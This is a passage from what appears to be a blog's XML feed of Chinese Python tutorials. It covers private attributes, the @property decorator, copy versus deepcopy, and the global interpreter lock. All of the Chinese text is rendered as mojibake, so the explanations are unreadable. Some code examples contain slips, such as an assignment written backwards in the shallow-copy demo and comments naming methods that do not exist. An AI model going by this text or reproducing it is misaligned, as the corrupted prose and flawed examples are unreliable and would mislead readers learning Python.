Studentç±»çš„ä¸­çš„testbug()æ–¹æ³•è°ƒç”¨ç§æœ‰ç±»_Bugä¸­çš„showbug()æ–¹æ³•</code></pre><p><strong>æ€»ç»“</strong>:</p><ul><li>çˆ¶ç±»ä¸­å±æ€§ä»¥<strong>__(åŒä¸‹åˆ’çº¿)</strong>å¼€å¤´çš„å˜é‡å,<strong>å­ç±»ä¸èƒ½ç»§æ‰¿,ä¹Ÿä¸èƒ½è®¿é—®</strong></li><li>å¦‚æœåœ¨å­ç±»ä¸­å‘__(åŒä¸‹åˆ’çº¿)å¼€å¤´çš„å˜é‡åèµ‹å€¼,é‚£ä¹ˆä¼šåœ¨å­ç±»ä¸­å®šä¹‰çš„ä¸€ä¸ªä¸çˆ¶ç±»ç›¸åŒåå­—çš„å±æ€§.</li><li>_(å•ä¸‹åˆ’çº¿)çš„å˜é‡,å‡½æ•°,ç±»åœ¨ä½¿ç”¨from xxx import * æ—¶ä¸ä¼šè¢«å¯¼å…¥</li></ul>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>PythonPropertyå±æ€§</title>
      <link href="/2018/11/15/property-shu-xing/"/>
      <url>/2018/11/15/property-shu-xing/</url>
      
        <content type="html"><![CDATA[<h1 id="ä»€ä¹ˆæ˜¯propertyå±æ€§"><a href="#ä»€ä¹ˆæ˜¯propertyå±æ€§" class="headerlink" title="ä»€ä¹ˆæ˜¯propertyå±æ€§"></a>ä»€ä¹ˆæ˜¯propertyå±æ€§</h1><p>åœ¨è®¸å¤šé¢å‘å¯¹è±¡çš„ç¼–ç¨‹è¯­è¨€ä¸­(Java)ä½¿ç”¨getterå’Œsetteræ¥ç¡®ä¿æ•°æ®å°è£…ã€‚å®ƒä»¬ä¹Ÿè¢«ç§°ä¸ºmutatoræ–¹æ³•ã€‚<br>è¿™äº›æ–¹æ³•å½“ç„¶æ˜¯ç”¨äºè·å–æ•°æ®çš„getterå’Œç”¨äºæ›´æ”¹æ•°æ®çš„setterã€‚æ ¹æ®è¿™ä¸ªåŸåˆ™ï¼Œç±»çš„å±æ€§æ˜¯ç§æœ‰çš„ï¼Œä»¥éšè—å’Œä¿æŠ¤å®ƒä»¬å…å—å…¶ä»–ä»£ç çš„å½±å“</p><blockquote><p>mutatoræ–¹æ³•:æ”¹å˜å¯¹è±¡å±æ€§çš„æ–¹æ³•</p></blockquote><p>ç®€å•æ¥è¯´å°±æ˜¯ç”¨èµ·æ¥åƒæ˜¯ä½¿ç”¨çš„å®ä¾‹å±æ€§ä¸€æ ·çš„<strong>ç‰¹æ®Šå±æ€§</strong>ï¼Œå¯ä»¥<strong>å¯¹åº”äºæŸä¸ªæ–¹æ³•</strong></p><pre><code># ############### å®šä¹‰ ###############class Pager:    def __init__(self, current_page):        # ç”¨æˆ·å½“å‰è¯·æ±‚çš„é¡µç ï¼ˆç¬¬ä¸€é¡µã€ç¬¬äºŒé¡µ...ï¼‰        self.current_page = current_page        # æ¯é¡µé»˜è®¤æ˜¾ç¤º10æ¡æ•°æ®        self.per_items = 10     @property    def start(self):        val = (self.current_page - 1) * self.per_items        return val    @property    def end(self):        val = self.current_page * self.per_items        return val# ############### è°ƒç”¨ ###############p = Pager(1)print(p.start)  # å°±æ˜¯èµ·å§‹å€¼ï¼Œå³ï¼šmprint(p.end)  # å°±æ˜¯ç»“æŸå€¼ï¼Œå³ï¼šn</code></pre><h2 id="Propertyå®šä¹‰æ—¶æ³¨æ„"><a href="#Propertyå®šä¹‰æ—¶æ³¨æ„" class="headerlink" title="Propertyå®šä¹‰æ—¶æ³¨æ„:"></a>Propertyå®šä¹‰æ—¶æ³¨æ„:</h2><p>å®šä¹‰æ—¶,åœ¨<strong>å®ä¾‹æ–¹æ³•</strong>çš„åŸºç¡€ä¸Šæ·»åŠ <strong>@propertyè£…é¥°å™¨</strong>,å¹¶ä¸”<strong>å®åŠ›æ–¹æ³•ä»…æœ‰ä¸€ä¸ªselfå‚æ•°</strong></p><pre><code># ############### å®šä¹‰ ###############class Goods():    @property    def test(self):        return 100# ############### è°ƒç”¨ ###############a = Goods()num = a.testprint(num)</code></pre><p><strong>è°ƒç”¨æ—¶æ— éœ€ä½¿ç”¨æ‹¬å·</strong></p><p>è°ƒç”¨æ–¹æ³•ï¼šfoo_obj.func()</p><p>è°ƒç”¨propertyå±æ€§ï¼šfoo_obj.prop</p><h1 id="å®ä¾‹"><a href="#å®ä¾‹" class="headerlink" title="å®ä¾‹"></a>å®ä¾‹</h1><pre><code>class Pager:    def __init__(self, current_page):        self.current_page = current_page        self.per_items = 10     @property    def start(self):        val = (self.current_page - 1) * self.per_items        return val    @property    def end(self):        val = self.current_page * self.per_items        return valp = Pager(2)p.start  p.end</code></pre><p>åœ¨è¿™é‡Œçš„propertyå±æ€§çš„åŠŸèƒ½ï¼špropertyå±æ€§å†…éƒ¨è¿›è¡Œä¸€ç³»åˆ—çš„é€»è¾‘è®¡ç®—ï¼Œæœ€ç»ˆå°†è®¡ç®—ç»“æœè¿”å›ã€‚</p><h1 id="å®šä¹‰Propertyå±æ€§çš„ä¸¤ç§æ–¹å¼"><a href="#å®šä¹‰Propertyå±æ€§çš„ä¸¤ç§æ–¹å¼" class="headerlink" title="å®šä¹‰Propertyå±æ€§çš„ä¸¤ç§æ–¹å¼"></a>å®šä¹‰Propertyå±æ€§çš„ä¸¤ç§æ–¹å¼</h1><ol><li>è£…é¥°å™¨æ–¹å¼:åœ¨ç±»çš„å®ä¾‹æ–¹æ³•ä¸Šæ·»åŠ @propertyè£…é¥°å™¨</li><li>ç±»å±æ€§æ–¹å¼:åœ¨ç±»å®šä¹‰æ—¶å®šä¹‰å€¼ä¸ºpropertyå¯¹è±¡çš„ç±»å±æ€§</li></ol><h2 id="æ–°å¼ç±»ä¸­å®šä¹‰è£…é¥°å™¨çš„æ–¹å¼"><a href="#æ–°å¼ç±»ä¸­å®šä¹‰è£…é¥°å™¨çš„æ–¹å¼" class="headerlink" title="æ–°å¼ç±»ä¸­å®šä¹‰è£…é¥°å™¨çš„æ–¹å¼"></a>æ–°å¼ç±»ä¸­å®šä¹‰è£…é¥°å™¨çš„æ–¹å¼</h2><pre><code>#coding=utf-8class Goods:    @property    def price(self):        print(&#39;@property&#39;)    @price.setter    def price(self, value):        print(&#39;@price.setter&#39;)    @price.deleter    def price(self):        print(&#39;@price.deleter&#39;)obj = Goods()obj.price          # è‡ªåŠ¨æ‰§è¡Œ @property ä¿®é¥°çš„priceæ–¹æ³•ï¼Œå¹¶è·å–æ–¹æ³•çš„è¿”å›å€¼obj.price = 123    # è‡ªåŠ¨æ‰§è¡Œ @price.setter ä¿®é¥°çš„ price æ–¹æ³•ï¼Œå¹¶å°†  123 èµ‹å€¼ç»™æ–¹æ³•çš„å‚æ•°del obj.price      # è‡ªåŠ¨æ‰§è¡Œ @price.deleter ä¿®é¥°çš„ price æ–¹æ³•</code></pre><p><strong>æ–°å¼ç±»ä¸­Propertyå±æ€§çš„ä¸‰ç§è®¿é—®æ–¹å¼å¯¹åº”äº†ä¸‰ä¸ªè¢«@property,@æ–¹æ³•å.setter,@æ–¹æ³•å.deleterä¿®é¥°çš„æ–¹æ³•.ç”±äºæ–°å¼ç±»ä¸­æœ‰ä¸‰ç§è®¿é—®æ–¹å¼,æˆ‘ä»¬å¯ä»¥æ ¹æ®ä»–ä»¬ä¸‰ä¸ªçš„è®¿é—®ç‰¹ç‚¹,åˆ†åˆ«å°†ä¸‰ä¸ªæ–¹æ³•å®šä¹‰ä¸ºå¯¹åŒä¸€ä¸ªå±æ€§çš„è·å–,ä¿®æ”¹,åˆ é™¤</strong></p><blockquote><p>æ–°å¼ç±»:å¦‚æœç±»ç»§æ‰¿äº†objectï¼Œé‚£ä¹ˆè¯¥ç±»æ˜¯æ–°å¼ç±»</p></blockquote><p>å¦ä¸€ä¸ªDemo</p><pre><code>class Goods(object):    def __init__(self):        # åŸä»·        self.original_price = 100        # æŠ˜æ‰£        self.discount = 0.8    @property    def price(self):        # å®é™…ä»·æ ¼ = åŸä»· * æŠ˜æ‰£        new_price = self.original_price * self.discount        return new_price    @price.setter    def price(self, value):        self.original_price = value    @price.deleter    def price(self):        del self.original_priceobj = Goods()obj.price         # è·å–å•†å“ä»·æ ¼obj.price = 200   # ä¿®æ”¹å•†å“åŸä»·del obj.price     # åˆ é™¤å•†å“åŸä»·</code></pre><h2 id="ç±»å±æ€§æ–¹å¼"><a href="#ç±»å±æ€§æ–¹å¼" class="headerlink" title="ç±»å±æ€§æ–¹å¼"></a>ç±»å±æ€§æ–¹å¼</h2><pre><code>&quot;&quot;&quot;propertyæ–¹æ³•ä¸­æœ‰ä¸ªå››ä¸ªå‚æ•°    ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æ–¹æ³•åï¼Œè°ƒç”¨ å¯¹è±¡.å±æ€§ æ—¶è‡ªåŠ¨è§¦å‘æ‰§è¡Œæ–¹æ³•    ç¬¬äºŒä¸ªå‚æ•°æ˜¯æ–¹æ³•åï¼Œè°ƒç”¨ å¯¹è±¡.å±æ€§ ï¼ XXX æ—¶è‡ªåŠ¨è§¦å‘æ‰§è¡Œæ–¹æ³•    ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯æ–¹æ³•åï¼Œè°ƒç”¨ del å¯¹è±¡.å±æ€§ æ—¶è‡ªåŠ¨è§¦å‘æ‰§è¡Œæ–¹æ³•    ç¬¬å››ä¸ªå‚æ•°æ˜¯å­—ç¬¦ä¸²ï¼Œè°ƒç”¨ å¯¹è±¡.å±æ€§.__doc__ ï¼Œæ­¤å‚æ•°æ˜¯è¯¥å±æ€§çš„æè¿°ä¿¡æ¯&quot;&quot;&quot;class Goods(object):    def __init__(self):        # åŸä»·        self.original_price = 100        # æŠ˜æ‰£        self.discount = 0.8    def get_price(self):        # å®é™…ä»·æ ¼ = åŸä»· * æŠ˜æ‰£        new_price = self.original_price * self.discount        return new_price    def set_price(self, value):        &quot;&quot;&quot;å¿…é¡»ä¸¤ä¸ªå‚æ•°&quot;&quot;&quot;        self.original_price = value    def del_price(self):        del self.original_price    PRICES = property(get_price, set_price, del_price, &quot;description...&quot;)  # åˆ›å»ºå€¼ä¸ºpropertyå¯¹è±¡çš„ç±»å±æ€§obj = Goods()obj.PRICES  # è‡ªåŠ¨è°ƒç”¨ç¬¬ä¸€ä¸ªå‚æ•°ä¸­å®šä¹‰çš„æ–¹æ³•ï¼šget_barprint(obj.PRICES)obj.PRICES = 200  # è‡ªåŠ¨è°ƒç”¨ç¬¬äºŒä¸ªå‚æ•°ä¸­å®šä¹‰çš„æ–¹æ³•ï¼šset_baræ–¹æ³•ï¼Œå¹¶å°†â€œalexâ€å½“ä½œå‚æ•°ä¼ å…¥print(obj.PRICES)desc = Goods.PRICES.__doc__  # è‡ªåŠ¨è·å–ç¬¬å››ä¸ªå‚æ•°ä¸­è®¾ç½®çš„å€¼ï¼šdescription...print(desc)del obj.PRICES  # è‡ªåŠ¨è°ƒç”¨ç¬¬ä¸‰ä¸ªå‚æ•°ä¸­å®šä¹‰çš„æ–¹æ³•ï¼šdel_baræ–¹æ³•</code></pre><p><strong>ç”±äºä½¿ç”¨ç±»å±æ€§æ–¹å¼åˆ›å»ºpropertyå±æ€§å…·æœ‰3ç§è®¿é—®æ–¹å¼ï¼Œæˆ‘ä»¬å¯ä»¥æ ¹æ®å®ƒä»¬å‡ ä¸ªå±æ€§çš„è®¿é—®ç‰¹ç‚¹ï¼Œåˆ†åˆ«å°†ä¸‰ä¸ªæ–¹æ³•å®šä¹‰ä¸ºå¯¹åŒä¸€ä¸ªå±æ€§ï¼šè·å–ã€ä¿®æ”¹ã€åˆ é™¤</strong></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Pythonä¸­çš„æ·±æ‹·è´å’Œæµ…æ‹·è´</title>
      <link href="/2018/11/14/python-zhong-de-shen-kao-bei-he-qian-kao-bei/"/>
      <url>/2018/11/14/python-zhong-de-shen-kao-bei-he-qian-kao-bei/</url>
      
        <content type="html"><![CDATA[<h1 id="é¢è¯•é¢˜-æ·±æ‹·è´å’Œæµ…æ‹·è´çš„åŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#é¢è¯•é¢˜-æ·±æ‹·è´å’Œæµ…æ‹·è´çš„åŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="é¢è¯•é¢˜:æ·±æ‹·è´å’Œæµ…æ‹·è´çš„åŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿ"></a>é¢è¯•é¢˜:æ·±æ‹·è´å’Œæµ…æ‹·è´çš„åŒºåˆ«æ˜¯ä»€ä¹ˆï¼Ÿ</h1><p>æ·±æ‹·è´æ˜¯å°†å¯¹è±¡æœ¬èº«<strong>å¤åˆ¶</strong>ç»™å¦ä¸€ä¸ªå¯¹è±¡.è¿™æ„å‘³ç€å¦‚æœå¯¹<strong>å¯¹è±¡å‰¯æœ¬è¿›è¡Œä¿®æ”¹æ—¶ä¸ä¼šå½±å“åŸå¯¹è±¡</strong>.<br>ä½¿ç”¨<strong>copy.deepcopy()</strong>è¿›è¡Œæ·±æ‹·è´.<br>æµ…æ‹·è´æ˜¯å°†å¯¹è±¡çš„<strong>å¼•ç”¨å¤åˆ¶</strong>ç»™å¦ä¸€ä¸ªå¯¹è±¡.å› æ­¤å¦‚æœ<strong>åœ¨å‰¯æœ¬ä¸­è¿›è¡Œæ›´æ”¹,åˆ™ä¼šå½±å“åŸå¯¹è±¡</strong>.<br>ä½¿ç”¨<strong>copy.copy()</strong>è¿›è¡Œæµ…æ‹·è´.</p><p>å¦‚æœcopy.copy()æ‹·è´çš„æ˜¯å…ƒç»„,é‚£ä¹ˆå®ƒä¸ä¼šè¿›è¡Œæµ…æ‹·è´,ä»…ä»…æ˜¯æŒ‡å‘,<br>åŸå› :<br>å› ä¸ºå…ƒç»„æ˜¯ä¸å¯å˜ç±»å‹,é‚£ä¹ˆæ„å‘³ç€æ•°æ®ä¸èƒ½è¢«ä¿®æ”¹,å› æ­¤ä½¿ç”¨copy.copyçš„æ—¶å€™å®ƒä¼šè‡ªåŠ¨åˆ¤æ–­,å¦‚æœæ˜¯å…ƒç»„å³ä¸ºæŒ‡å‘å®ƒ</p><h2 id="æµ…æ‹·è´å¯¹ä¸å¯å˜ç±»å‹å’Œå¯å˜ç±»å‹çš„copyä¸åŒ"><a href="#æµ…æ‹·è´å¯¹ä¸å¯å˜ç±»å‹å’Œå¯å˜ç±»å‹çš„copyä¸åŒ" class="headerlink" title="æµ…æ‹·è´å¯¹ä¸å¯å˜ç±»å‹å’Œå¯å˜ç±»å‹çš„copyä¸åŒ"></a>æµ…æ‹·è´å¯¹ä¸å¯å˜ç±»å‹å’Œå¯å˜ç±»å‹çš„copyä¸åŒ</h2><p><strong>copy.copyå¯¹äºå¯å˜ç±»å‹ï¼Œä¼šè¿›è¡Œæµ…æ‹·è´</strong><br>æ‹·è´åˆ—è¡¨(æµ…æ‹·è´)</p><pre><code>In [37]: a = [11,22]In [38]: a = bIn [39]: id(a)Out[39]: 1450292786952In [40]: id(b)Out[40]: 1450292786952In [41]: c = copy(a)In [42]: id(c)Out[42]: 1450285430728</code></pre><p><strong>copy.copyå¯¹äºä¸å¯å˜ç±»å‹ï¼Œä¸ä¼šæ‹·è´ï¼Œä»…ä»…æ˜¯æŒ‡å‘</strong><br>æ‹·è´å…ƒç»„(éæµ…æ‹·è´)</p><pre><code>In [43]: a = (11,22)In [44]: b = copy(a)In [45]: id(a)Out[45]: 1450293531912In [46]: id(b)Out[46]: 1450293531912</code></pre><p><strong>ä½¿ç”¨Deepcopy()æ–¹æ³•æ‹·è´å…ƒç»„,è¿™é‡Œä¹Ÿä¸æ˜¯æ‹·è´,è€Œæ˜¯æŒ‡å‘</strong></p><pre><code>In [47]: a = (11,22)In [48]: b = deepcopy(a)In [49]: aOut[49]: (11, 22)In [50]: bOut[50]: (11, 22)In [51]: id(a)Out[51]: 1450285549896In [52]: id(b)Out[52]: 1450285549896</code></pre><p><strong>å¦‚æœå…ƒç»„ä¸­æœ‰å¯å˜æ•°æ®ç±»å‹,ä½¿ç”¨copyä¸ä¼šæ‹·è´è€Œæ˜¯æŒ‡å‘,ä½†æ˜¯ä½¿ç”¨Deepcopyçš„æ—¶å€™ä¼šè¿›è¡Œæ·±æ‹·è´.</strong></p><pre><code>In [53]: a = [11,22]In [54]: b = [33,44]In [55]: c = (a,b)In [56]: d = copy(c)In [57]: id(c)Out[57]: 1450292947720In [58]: id(d)Out[58]: 1450292947720In [59]:In [59]: e = deepcopy(c)In [60]: id(e)Out[60]: 1450285501960In [61]: id(c)Out[61]: 1450292947720In [62]: a.append(99)In [63]: cOut[63]: ([11, 22, 99], [33, 44])In [64]: eOut[64]: ([11, 22], [33, 44])</code></pre><p>ç»“è®º:<br>å¦‚æœç”¨copy,deepcopy<strong>å¯¹ä¸€ä¸ªå…¨éƒ¨éƒ½æ˜¯ä¸å¯å˜æ•°æ®ç±»å‹çš„æ•°æ®è¿›è¡Œæ‹·è´,é‚£ä¹ˆä»–ä»¬ç»“æœç›¸åŒ,éƒ½æ˜¯å¼•ç”¨æŒ‡å‘.</strong><br>å¦‚æœ<strong>æ‹·è´çš„ä¸€ä¸ªæ‹¥æœ‰å¯å˜æ•°æ®ç±»å‹çš„æ•°æ®,å³ä½¿å…ƒç»„æ˜¯åœ¨æœ€é¡¶å±‚,é‚£ä¹ˆdeepcopyä¾ç„¶æ˜¯æ·±æ‹·è´</strong>,è€Œcopyåˆ™æ˜¯æŒ‡å‘.</p><p><strong>ç»™å‡½æ•°ä¼ é€’å®å‚çš„æ—¶å€™ä¼ é€’çš„æ˜¯å¼•ç”¨.</strong><br>å˜é‡å=å€¼â€”â€“&gt;æŒ‡å‘<br>æµ…æ‹·è´:<strong>æ‹·è´æœ€é¡¶å±‚</strong><br>å˜é‡å=å¦ä¸€ä¸ªå˜é‡åä¹Ÿæ˜¯æµ…æ‹·è´</p><h1 id="å…¶ä»–æ–¹å¼çš„æ‹·è´"><a href="#å…¶ä»–æ–¹å¼çš„æ‹·è´" class="headerlink" title="å…¶ä»–æ–¹å¼çš„æ‹·è´"></a>å…¶ä»–æ–¹å¼çš„æ‹·è´</h1><p><strong>åˆ‡ç‰‡èµ‹å€¼ä¹Ÿæ˜¯ä¸€ç§æµ…æ‹·è´</strong></p><pre><code>In [1]: a = [11,22]In [2]: b = [33,44]In [3]: c = [a,b]In [6]: d = c[:]In [7]: id(d)Out[7]: 3129848727688In [8]: id(c)Out[8]: 3129848727880In [9]: id(c[0])Out[9]: 3129855906312In [10]: id(d[0])Out[10]: 3129855906312In [11]: aOut[11]: [11, 22]In [12]: bOut[12]: [33, 44]In [13]: a.append(110)In [14]: cOut[14]: [[11, 22, 110], [33, 44]]In [15]: dOut[15]: [[11, 22, 110], [33, 44]]</code></pre><p><strong>å­—å…¸çš„copy()æ–¹æ³•æ‹·è´çš„æ˜¯ä¸€ä¸ªå­—å…¸</strong></p><pre><code>In [39]: d = dict(name=&quot;åˆ˜å¤‡&quot;,age=22,son_ages = [11,22])In [40]: dOut[40]: {&#39;name&#39;: &#39;åˆ˜å¤‡&#39;, &#39;age&#39;: 22, &#39;son_ages&#39;: [11, 22]}In [41]: co = d.copy()In [42]: coOut[42]: {&#39;name&#39;: &#39;åˆ˜å¤‡&#39;, &#39;age&#39;: 22, &#39;son_ages&#39;: [11, 22]}In [43]: d[&quot;son_ages&quot;].append(99)In [44]: dOut[44]: {&#39;name&#39;: &#39;åˆ˜å¤‡&#39;, &#39;age&#39;: 22, &#39;son_ages&#39;: [11, 22, 99]}In [45]: coOut[45]: {&#39;name&#39;: &#39;åˆ˜å¤‡&#39;, &#39;age&#39;: 22, &#39;son_ages&#39;: [11, 22, 99]}In [46]: id(d)Out[46]: 3129856433536In [47]: id(co)Out[47]: 3129856433248</code></pre>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Pythonä¸­çš„GILé—®é¢˜</title>
      <link href="/2018/11/12/python-zhong-de-gil-wen-ti/"/>
      <url>/2018/11/12/python-zhong-de-gil-wen-ti/</url>
      
        <content type="html"><![CDATA[<h1 id="ä»€ä¹ˆæ˜¯GIL"><a href="#ä»€ä¹ˆæ˜¯GIL" class="headerlink" title="ä»€ä¹ˆæ˜¯GIL"></a>ä»€ä¹ˆæ˜¯GIL</h1><p>ç®€å•æ¥è¯´ï¼ŒPythonå…¨å±€è§£é‡Šå™¨é”æˆ–GILæ˜¯ä¸€ä¸ªäº’æ–¥é”ï¼Œå®ƒåªå…è®¸ä¸€ä¸ªçº¿ç¨‹æ¥æ§åˆ¶Pythonè§£é‡Šå™¨<br>è¿™æ„å‘³ç€åœ¨ä»»ä½•æ—¶é—´ç‚¹åªæœ‰ä¸€ä¸ªçº¿ç¨‹å¯ä»¥å¤„äºæ‰§è¡ŒçŠ¶æ€ã€‚æ‰§è¡Œå•çº¿ç¨‹ç¨‹åºçš„å¼€å‘äººå‘˜çœ‹ä¸åˆ°GILçš„å½±å“ï¼Œä½†å®ƒå¯èƒ½æ˜¯CPUç»‘å®šå’Œ<strong>å¤šçº¿ç¨‹ä»£ç ä¸­çš„æ€§èƒ½ç“¶é¢ˆ</strong><br>ç”±äºå³ä½¿åœ¨å…·æœ‰å¤šä¸ªCPUæ ¸å¿ƒçš„å¤šçº¿ç¨‹ä½“ç³»ç»“æ„ä¸­ï¼ŒGILä¸€æ¬¡åªå…è®¸ä¸€ä¸ªçº¿ç¨‹æ‰§è¡Œï¼Œå› æ­¤GILå·²ç»èµ¢å¾—äº†Pythonçš„â€œè‡­åæ˜­ç€â€ç‰¹æ€§çš„å£°èª‰ã€‚<br>Pythonå®˜ç½‘å¯¹GILçš„è§£é‡Š:</p><blockquote><p>åœ¨CPythonä¸­ï¼Œå…¨å±€è§£é‡Šå™¨é”ï¼ˆGILï¼‰æ˜¯ä¸€ä¸ªäº’æ–¥é”ï¼Œç”¨äºä¿æŠ¤å¯¹Pythonå¯¹è±¡çš„è®¿é—®ï¼Œ<strong>é˜²æ­¢å¤šä¸ªçº¿ç¨‹åŒæ—¶æ‰§è¡ŒPythonå­—èŠ‚ç </strong>ã€‚è¿™ç§é”æ˜¯å¿…è¦çš„ï¼Œä¸»è¦æ˜¯å› ä¸ºCPythonçš„<strong>å†…å­˜ç®¡ç†ä¸æ˜¯çº¿ç¨‹å®‰å…¨</strong>çš„ã€‚ï¼ˆä½†æ˜¯ï¼Œç”±äºGILå­˜åœ¨ï¼Œå…¶ä»–åŠŸèƒ½å·²ç»å¢é•¿ï¼Œå–å†³äºå®ƒå¼ºåˆ¶æ‰§è¡Œçš„ä¿è¯ã€‚</p></blockquote><h1 id="GILä¸ºPythonè§£å†³äº†ä»€ä¹ˆé—®é¢˜ï¼Ÿ"><a href="#GILä¸ºPythonè§£å†³äº†ä»€ä¹ˆé—®é¢˜ï¼Ÿ" class="headerlink" title="GILä¸ºPythonè§£å†³äº†ä»€ä¹ˆé—®é¢˜ï¼Ÿ"></a>GILä¸ºPythonè§£å†³äº†ä»€ä¹ˆé—®é¢˜ï¼Ÿ</h1><pre><code>import sysa = []        # åˆ›å»ºä¸€ä¸ªåˆ—è¡¨å¯¹è±¡b = a        # å°†åˆ—è¡¨å¯¹è±¡çš„å¼•ç”¨æŒ‡å‘bsys.getrefcount(a)        # æŸ¥çœ‹açš„å¼•ç”¨è®¡æ•°</code></pre><p>å›åˆ°GILçš„é—®é¢˜:<br>é—®é¢˜æ˜¯è¿™ä¸ªå¼•ç”¨è®¡æ•°å˜é‡éœ€è¦ä¿æŠ¤ç«äº‰æ¡ä»¶ï¼Œå…¶ä¸­ä¸¤ä¸ªçº¿ç¨‹åŒæ—¶å¢åŠ æˆ–å‡å°‘å…¶å€¼ã€‚å¦‚æœå‘ç”Ÿè¿™ç§æƒ…å†µï¼Œå®ƒå¯èƒ½ä¼šå¯¼è‡´ä»æœªé‡Šæ”¾çš„æ³„æ¼å†…å­˜ï¼Œæˆ–è€…æ›´ç³Ÿç³•çš„æ˜¯ï¼Œåœ¨å¯¹è¯¥å¯¹è±¡çš„å¼•ç”¨ä»ç„¶å­˜åœ¨æ—¶é”™è¯¯åœ°é‡Šæ”¾å†…å­˜ã€‚è¿™å¯èƒ½ä¼šå¯¼è‡´Pythonç¨‹åºä¸­å‡ºç°å´©æºƒæˆ–å…¶ä»–â€œæ€ªå¼‚â€é”™è¯¯<br>é—®é¢˜æ˜¯ï¼Œè¿™ä¸ªå¼•ç”¨è®¡æ•°å˜é‡éœ€è¦é˜²æ­¢ä¸¤ä¸ªçº¿ç¨‹åŒæ—¶å¢åŠ æˆ–å‡å°‘å¯¹å…¶å€¼çš„èµ„æºç«äº‰ã€‚å¦‚æœå‘ç”Ÿè¿™ç§æƒ…å†µï¼Œå®ƒå¯èƒ½å¯¼è‡´æ°¸è¿œä¸ä¼šé‡Šæ”¾çš„æ³„æ¼å†…å­˜ï¼Œæˆ–è€…æ›´ç³Ÿç³•çš„æ˜¯ï¼Œåœ¨ä»ç„¶å­˜åœ¨å¯¹è¯¥å¯¹è±¡çš„å¼•ç”¨æ—¶é”™è¯¯åœ°é‡Šæ”¾å†…å­˜ã€‚è¿™å¯èƒ½ä¼šå¯¼è‡´Pythonç¨‹åºå´©æºƒæˆ–å…¶ä»–â€œå¥‡æ€ªâ€çš„é”™è¯¯ã€‚<br>é€šè¿‡å‘è·¨çº¿ç¨‹å…±äº«çš„æ‰€æœ‰æ•°æ®ç»“æ„æ·»åŠ é”ï¼Œå¯ä»¥ä¿æŒæ­¤å¼•ç”¨è®¡æ•°å˜é‡çš„å®‰å…¨ï¼Œä»è€Œä¸ä¼šå¯¹å®ƒä»¬è¿›è¡Œä¸ä¸€è‡´çš„ä¿®æ”¹ã€‚<br>ä½†æ˜¯ä¸ºæ¯ä¸ªå¯¹è±¡æˆ–å¯¹è±¡ç»„æ·»åŠ ä¸€ä¸ªé”æ„å‘³ç€ä¼šå­˜åœ¨å¤šä¸ªé”ï¼Œè¿™å¯èƒ½ä¼šå¯¼è‡´å¦ä¸€ä¸ªé—®é¢˜-<strong>æ­»é”</strong>ï¼ˆæ­»é”åªæœ‰åœ¨æœ‰å¤šä¸ªé”çš„æƒ…å†µä¸‹æ‰ä¼šå‘ç”Ÿï¼‰ã€‚å¦ä¸€ä¸ªå‰¯ä½œç”¨æ˜¯ç”±äºé‡å¤è·å–å’Œé‡Šæ”¾é”è€Œå¯¼è‡´æ€§èƒ½ä¸‹é™ã€‚<br>GILæ˜¯è§£é‡Šå™¨æœ¬èº«çš„å•ä¸ªé”ï¼Œå®ƒå¢åŠ äº†ä¸€æ¡è§„åˆ™ï¼Œå³æ‰§è¡Œä»»ä½•Pythonå­—èŠ‚ç éƒ½éœ€è¦è·å–è§£é‡Šå™¨é”ã€‚è¿™å¯ä»¥é˜²æ­¢æ­»é”ï¼ˆå› ä¸ºåªæœ‰ä¸€ä¸ªé”ï¼‰å¹¶ä¸”ä¸ä¼šå¼•å…¥å¤ªå¤šçš„æ€§èƒ½å¼€é”€ã€‚ä½†å®ƒæœ‰æ•ˆåœ°ä½¿ä»»ä½•å—CPUé™åˆ¶çš„Pythonç¨‹åºéƒ½æ˜¯å•çº¿ç¨‹çš„ã€‚<br>GILè™½ç„¶è¢«è§£é‡Šå™¨ç”¨äºå…¶ä»–è¯­è¨€ï¼ˆå¦‚Rubyï¼‰ï¼Œä½†å¹¶ä¸æ˜¯è§£å†³æ­¤é—®é¢˜çš„å”¯ä¸€æ–¹æ³•ã€‚æœ‰äº›è¯­è¨€é€šè¿‡ä½¿ç”¨é™¤å¼•ç”¨è®¡æ•°ä¹‹å¤–çš„æ–¹æ³•ï¼ˆä¾‹å¦‚åƒåœ¾æ”¶é›†ï¼‰æ¥é¿å…GILå¯¹çº¿ç¨‹å®‰å…¨å†…å­˜ç®¡ç†çš„è¦æ±‚ã€‚<br>å¦ä¸€æ–¹é¢ï¼Œè¿™æ„å‘³ç€è¿™äº›è¯­è¨€é€šå¸¸éœ€è¦é€šè¿‡æ·»åŠ å…¶ä»–æ€§èƒ½æå‡åŠŸèƒ½ï¼ˆå¦‚JITç¼–è¯‘å™¨ï¼‰æ¥å¼¥è¡¥GILå•çº¿ç¨‹æ€§èƒ½ä¼˜åŠ¿çš„æŸå¤±ã€‚</p><h1 id="ä¸ºä»€ä¹ˆé€‰æ‹©GILä½œä¸ºè§£å†³æ–¹æ¡ˆï¼Ÿ"><a href="#ä¸ºä»€ä¹ˆé€‰æ‹©GILä½œä¸ºè§£å†³æ–¹æ¡ˆï¼Ÿ" class="headerlink" title="ä¸ºä»€ä¹ˆé€‰æ‹©GILä½œä¸ºè§£å†³æ–¹æ¡ˆï¼Ÿ"></a>ä¸ºä»€ä¹ˆé€‰æ‹©GILä½œä¸ºè§£å†³æ–¹æ¡ˆï¼Ÿ</h1><p>è‡ªä»æ“ä½œç³»ç»Ÿæ²¡æœ‰çº¿ç¨‹æ¦‚å¿µä»¥æ¥ï¼ŒPythonå°±å·²å­˜åœ¨ã€‚Pythonçš„è®¾è®¡æ˜“äºä½¿ç”¨ï¼Œä»¥ä¾¿æ›´å¿«åœ°å¼€å‘ï¼Œè¶Šæ¥è¶Šå¤šçš„å¼€å‘äººå‘˜å¼€å§‹ä½¿ç”¨å®ƒã€‚<br>GILæ˜“äºå®ç°ï¼Œå¾ˆå®¹æ˜“æ·»åŠ 